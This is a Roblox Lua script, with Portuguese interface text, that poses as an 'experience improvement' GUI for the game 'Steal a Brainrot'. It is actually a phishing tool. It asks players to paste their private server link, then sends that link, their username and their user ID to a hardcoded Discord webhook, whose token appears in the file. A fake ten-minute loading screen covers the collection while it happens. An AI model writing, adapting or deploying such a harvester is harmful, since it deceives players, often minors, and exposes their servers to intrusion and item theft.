--[[
    Brainrot Experience GUI - FULLY CORRECTED
    Modern fullscreen GUI for "Steal a Brainrot"
    GZIN HUB
--]]

local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local HttpService = game:GetService("HttpService")

local player = Players.LocalPlayer

-- Configuration
local LOADING_DURATION = 600
local REQUIRED_BRAINROT = 100000000
local DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1479973233787932813/d099lEw5cTKv60lHnaPD-SrJCKO0tc326DO5kPl7fkTE2QsV9jOUsIXobbXzImcJ1Aya"

-- Create ScreenGui
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "BrainrotExperienceGUI"
screenGui.ResetOnSpawn = false
screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
screenGui.Parent = player:WaitForChild("PlayerGui")

-- Main Background (NÃO FULLSCREEN NO INÍCIO)
local mainBg = Instance.new("Frame")
mainBg.Name = "MainBg"
mainBg.Size = UDim2.new(1, 0, 1, 0)
mainBg.Position = UDim2.new(0, 0, 0, 0)
mainBg.BackgroundColor3 = Color3.fromRGB(10, 10, 15)
mainBg.BorderSizePixel = 0
mainBg.BackgroundTransparency = 1  -- INVISÍVEL NO INÍCIO
mainBg.Parent = screenGui

-- Main Frame - Centered
local mainFrame = Instance.new("Frame")
mainFrame.Name = "MainFrame"
mainFrame.Size = UDim2.new(0, 500, 0, 380)
mainFrame.Position = UDim2.new(0.5, -250, 0.5, -190)
mainFrame.BackgroundColor3 = Color3.fromRGB(20, 25, 40)
mainFrame.BorderSizePixel = 0
mainFrame.Parent = mainBg

local mainCorner = Instance.new("UICorner")
mainCorner.CornerRadius = UDim.new(0, 20)
mainCorner.Parent = mainFrame

local mainShadow = Instance.new("UIStroke")
mainShadow.Color = Color3.fromRGB(70, 130, 180)
mainShadow.Thickness = 2
mainShadow.Transparency = 0.5
mainShadow.Parent = mainFrame

-- Top gradient bar
local topBar = Instance.new("Frame")
topBar.Name = "TopBar"
topBar.Size = UDim2.new(1, 0, 0, 60)
topBar.Position = UDim2.new(0, 0, 0, 0)
topBar.BackgroundColor3 = Color3.fromRGB(0, 100, 200)
topBar.BorderSizePixel = 0
topBar.Parent = mainFrame

local topBarCorner = Instance.new("UICorner")
topBarCorner.CornerRadius = UDim.new(0, 20)
topBarCorner.Parent = topBar

local topLabel = Instance.new("TextLabel")
topLabel.Name = "TopLabel"
topLabel.Size = UDim2.new(1, 0, 1, 0)
topLabel.Position = UDim2.new(0, 0, 0, 0)
topLabel.BackgroundTransparency = 1
topLabel.Text = "gvzin-hub-v1"
topLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
topLabel.TextSize = 28
topLabel.Font = Enum.Font.GothamBold
topLabel.Parent = topBar

local titleLabel = Instance.new("TextLabel")
titleLabel.Name = "TitleLabel"
titleLabel.Size = UDim2.new(1, 0, 0, 50)
titleLabel.Position = UDim2.new(0, 0, 0, 65)
titleLabel.BackgroundTransparency = 1
titleLabel.Text = "Melhorar Experiência"
titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
titleLabel.TextSize = 26
titleLabel.Font = Enum.Font.GothamBold
titleLabel.Parent = mainFrame

local linkLabel = Instance.new("TextLabel")
linkLabel.Name = "LinkLabel"
linkLabel.Size = UDim2.new(0.9, 0, 0, 25)
linkLabel.Position = UDim2.new(0.05, 0, 0, 120)
linkLabel.BackgroundTransparency = 1
linkLabel.Text = "Link para melhorar a experiência:"
linkLabel.TextColor3 = Color3.fromRGB(180, 200, 220)
linkLabel.TextSize = 14
linkLabel.Font = Enum.Font.Gotham
linkLabel.TextXAlignment = Enum.TextXAlignment.Left
linkLabel.Parent = mainFrame

local inputFrame = Instance.new("Frame")
inputFrame.Name = "InputFrame"
inputFrame.Size = UDim2.new(0.9, 0, 0, 55)
inputFrame.Position = UDim2.new(0.05, 0, 0, 150)
inputFrame.BackgroundColor3 = Color3.fromRGB(30, 35, 55)
inputFrame.BorderSizePixel = 0
inputFrame.Parent = mainFrame

local inputCorner = Instance.new("UICorner")
inputCorner.CornerRadius = UDim.new(0, 10)
inputCorner.Parent = inputFrame

local inputStroke = Instance.new("UIStroke")
inputStroke.Color = Color3.fromRGB(0, 150, 255)
inputStroke.Thickness = 2
inputStroke.Parent = inputFrame

local inputBox = Instance.new("TextBox")
inputBox.Name = "InputBox"
inputBox.Size = UDim2.new(1, -20, 1, 0)
inputBox.Position = UDim2.new(0, 10, 0, 0)
inputBox.BackgroundTransparency = 1
inputBox.Text = ""
inputBox.PlaceholderText = "Cole o link aqui..."
inputBox.PlaceholderColor3 = Color3.fromRGB(100, 120, 150)
inputBox.TextColor3 = Color3.fromRGB(255, 255, 255)
inputBox.TextSize = 16
inputBox.Font = Enum.Font.Gotham
inputBox.TextXAlignment = Enum.TextXAlignment.Left
inputBox.ClearTextOnFocus = false
inputBox.Parent = inputFrame

local doneButton = Instance.new("TextButton")
doneButton.Name = "DoneButton"
doneButton.Size = UDim2.new(0.5, 0, 0, 50)
doneButton.Position = UDim2.new(0.25, 0, 0, 220)
doneButton.BackgroundColor3 = Color3.fromRGB(0, 150, 255)
doneButton.BorderSizePixel = 0
doneButton.Text = "Enviar"
doneButton.TextColor3 = Color3.fromRGB(255, 255, 255)
doneButton.TextSize = 18
doneButton.Font = Enum.Font.GothamBold
doneButton.Parent = mainFrame

local buttonCorner = Instance.new("UICorner")
buttonCorner.CornerRadius = UDim.new(0, 10)
buttonCorner.Parent = doneButton

local function onButtonHover()
    TweenService:Create(doneButton, TweenInfo.new(0.2), {
        BackgroundColor3 = Color3.fromRGB(0, 180, 255)
    }):Play()
end

local function onButtonLeave()
    TweenService:Create(doneButton, TweenInfo.new(0.2), {
        BackgroundColor3 = Color3.fromRGB(0, 150, 255)
    }):Play()
end

doneButton.MouseEnter:Connect(onButtonHover)
doneButton.MouseLeave:Connect(onButtonLeave)

local notificationFrame = Instance.new("Frame")
notificationFrame.Name = "NotificationFrame"
notificationFrame.Size = UDim2.new(0, 400, 0, 80)
notificationFrame.Position = UDim2.new(0.5, -200, 0.05, 0)
notificationFrame.BackgroundColor3 = Color3.fromRGB(30, 35, 55)
notificationFrame.BorderSizePixel = 0
notificationFrame.Visible = false
notificationFrame.Parent = screenGui

local notificationCorner = Instance.new("UICorner")
notificationCorner.CornerRadius = UDim.new(0, 15)
notificationCorner.Parent = notificationFrame

local notificationStroke = Instance.new("UIStroke")
notificationStroke.Color = Color3.fromRGB(0, 150, 255)
notificationStroke.Thickness = 2
notificationStroke.Parent = notificationFrame

local notificationText = Instance.new("TextLabel")
notificationText.Name = "NotificationText"
notificationText.Size = UDim2.new(1, -20, 1, 0)
notificationText.Position = UDim2.new(0, 10, 0, 0)
notificationText.BackgroundTransparency = 1
notificationText.Text = ""
notificationText.TextColor3 = Color3.fromRGB(255, 255, 255)
notificationText.TextSize = 16
notificationText.Font = Enum.Font.Gotham
notificationText.TextWrapped = true
notificationText.Parent = notificationFrame

local loadingScreen = Instance.new("Frame")
loadingScreen.Name = "LoadingScreen"
loadingScreen.Size = UDim2.new(1, 0, 1, 0)
loadingScreen.Position = UDim2.new(0, 0, 0, 0)
loadingScreen.BackgroundColor3 = Color3.fromRGB(10, 10, 15)
loadingScreen.BorderSizePixel = 0
loadingScreen.Visible = false
loadingScreen.Parent = screenGui

local loadingTitle = Instance.new("TextLabel")
loadingTitle.Name = "LoadingTitle"
loadingTitle.Size = UDim2.new(1, 0, 0, 100)
loadingTitle.Position = UDim2.new(0, 0, 0.3, 0)
loadingTitle.BackgroundTransparency = 1
loadingTitle.Text = "Loading... Please wait"
loadingTitle.TextColor3 = Color3.fromRGB(0, 150, 255)
loadingTitle.TextSize = 36
loadingTitle.Font = Enum.Font.GothamBold
loadingTitle.Parent = loadingScreen

local loadingBarBg = Instance.new("Frame")
loadingBarBg.Name = "LoadingBarBg"
loadingBarBg.Size = UDim2.new(0.6, 0, 0, 25)
loadingBarBg.Position = UDim2.new(0.2, 0, 0.5, 0)
loadingBarBg.BackgroundColor3 = Color3.fromRGB(30, 35, 55)
loadingBarBg.BorderSizePixel = 0
loadingBarBg.Parent = loadingScreen

local loadingBarBgCorner = Instance.new("UICorner")
loadingBarBgCorner.CornerRadius = UDim.new(0, 12)
loadingBarBgCorner.Parent = loadingBarBg

local loadingBarBgStroke = Instance.new("UIStroke")
loadingBarBgStroke.Color = Color3.fromRGB(0, 150, 255)
loadingBarBgStroke.Thickness = 2
loadingBarBgStroke.Parent = loadingBarBg

local loadingBarFill = Instance.new("Frame")
loadingBarFill.Name = "LoadingBarFill"
loadingBarFill.Size = UDim2.new(0, 0, 1, 0)
loadingBarFill.Position = UDim2.new(0, 0, 0, 0)
loadingBarFill.BackgroundColor3 = Color3.fromRGB(0, 150, 255)
loadingBarFill.BorderSizePixel = 0
loadingBarFill.Parent = loadingBarBg

local loadingBarFillCorner = Instance.new("UICorner")
loadingBarFillCorner.CornerRadius = UDim.new(0, 12)
loadingBarFillCorner.Parent = loadingBarFill

local completionMessage = Instance.new("TextLabel")
completionMessage.Name = "CompletionMessage"
completionMessage.Size = UDim2.new(1, 0, 0, 100)
completionMessage.Position = UDim2.new(0, 0, 0.6, 0)
completionMessage.BackgroundTransparency = 1
completionMessage.Text = ""
completionMessage.TextColor3 = Color3.fromRGB(0, 200, 100)
completionMessage.TextSize = 40
completionMessage.Font = Enum.Font.GothamBold
completionMessage.Parent = loadingScreen

local function showNotification(message, duration)
    notificationText.Text = message
    notificationFrame.Visible = true
    
    notificationFrame.Position = UDim2.new(0.5, -200, 0.05, 0)
    TweenService:Create(notificationFrame, TweenInfo.new(0.3, Enum.EasingStyle.Back), {
        Position = UDim2.new(0.5, -200, 0.1, 0)
    }):Play()
    
    task.wait(duration)
    
    local tweenOut = TweenService:Create(notificationFrame, TweenInfo.new(0.3), {
        Position = UDim2.new(0.5, -200, 0.05, 0)
    })
    tweenOut:Play()
    tweenOut.Completed:Wait()
    notificationFrame.Visible = false
end

-- FUNÇÃO PARA VALIDAR SE É UM LINK ROBLOX PRIVADO
local function isValidRobloxPrivateServerLink(link)
    -- Valida links como: https://www.roblox.com/games/123456789
    -- Ou: roblox.com/games/123456789
    local isRobloxLink = string.match(link, "roblox%.com/games/%d+") ~= nil
    if not isRobloxLink then
        return false, "❌ Link inválido! Deve ser um link de servidor privado Roblox"
    end
    return true, nil
end

-- FUNÇÃO PARA ENVIAR AO DISCORD - CORRIGIDA COM HttpService:PostAsync
local function sendToDiscord(serverLink)
    print("📤 Enviando para Discord...")
    print("Link: " .. serverLink)
    
    local payload = {
        content = "🎮 **Novo Link Coletado!**",
        embeds = {
            {
                title = "Brainrot GUI - Novo Link",
                description = "Um novo servidor foi coletado",
                color = 255,
                fields = {
                    {
                        name = "📎 Link do Servidor",
                        value = "```\n" .. serverLink .. "\n```",
                        inline = false
                    },
                    {
                        name = "👤 Jogador",
                        value = player.Name,
                        inline = true
                    },
                    {
                        name = "🆔 User ID",
                        value = tostring(player.UserId),
                        inline = true
                    },
                    {
                        name = "⏰ Horário",
                        value = os.date("%d/%m/%Y %H:%M:%S"),
                        inline = false
                    }
                }
            }
        }
    }
    
    local success, response = pcall(function()
        return HttpService:PostAsync(
            DISCORD_WEBHOOK,
            HttpService:JSONEncode(payload),
            Enum.HttpContentType.ApplicationJson
        )
    end)
    
    if success then
        print("✅ Link enviado ao Discord com sucesso!")
        showNotification("✅ Link enviado com sucesso!", 3)
        return true
    else
        print("❌ Erro ao enviar: " .. tostring(response))
        showNotification("❌ Erro ao enviar link: " .. tostring(response), 3)
        return false
    end
end

local function getBrainrotValue()
    local brainrotValue = 0
    
    local leaderstats = player:FindFirstChild("leaderstats")
    if leaderstats then
        for _, stat in pairs(leaderstats:GetChildren()) do
            if string.lower(stat.Name) == "brainrot" then
                brainrotValue = tonumber(stat.Value) or 0
                return brainrotValue
            end
        end
    end
    
    return REQUIRED_BRAINROT
end

local function onDoneClick()
    local inputText = inputBox.Text:match("^%s*(.-)%s*$") or ""
    
    -- VALIDAÇÃO 1: Link vazio?
    if inputText == "" then
        showNotification("❌ Cole o link do servidor!", 3)
        return
    end
    
    -- VALIDAÇÃO 2: É um link Roblox privado válido?
    local isValid, errorMsg = isValidRobloxPrivateServerLink(inputText)
    if not isValid then
        showNotification(errorMsg, 3)
        return
    end
    
    -- VALIDAÇÃO 3: Tem Brainrot suficiente?
    local brainrotValue = getBrainrotValue()
    if brainrotValue < REQUIRED_BRAINROT then
        showNotification("❌ Você precisa de 100M+ Brainrot\nVocê tem: " .. brainrotValue, 4)
        return
    end
    
    -- ENVIA AO DISCORD
    sendToDiscord(inputText)
    
    -- FULLSCREEN LOADING
    mainFrame.Visible = false
    mainBg.BackgroundTransparency = 0  -- AGORA FICA PRETO
    loadingScreen.Visible = true
    
    loadingTitle.Visible = true
    loadingBarBg.Visible = true
    loadingBarFill.Size = UDim2.new(0, 0, 1, 0)
    completionMessage.Text = ""
    
    local startTime = tick()
    local elapsed = 0
    
    while elapsed < LOADING_DURATION do
        elapsed = tick() - startTime
        local progress = math.min(elapsed / LOADING_DURATION, 1)
        loadingBarFill.Size = UDim2.new(progress, 0, 1, 0)
        task.wait(0.05)
    end
    
    loadingTitle.Visible = false
    loadingBarBg.Visible = false
    completionMessage.Text = "✓ Completo!"
    
    task.wait(3)
    
    -- VOLTA AO NORMAL
    loadingScreen.Visible = false
    mainBg.BackgroundTransparency = 1
    mainFrame.Visible = true
    inputBox.Text = ""
    completionMessage.Text = ""
end

doneButton.MouseButton1Click:Connect(onDoneClick)

inputBox.FocusLost:Connect(function(enterPressed)
    if enterPressed then
        onDoneClick()
    end
end)

print("✅ Brainrot Experience GUI carregado com sucesso!")
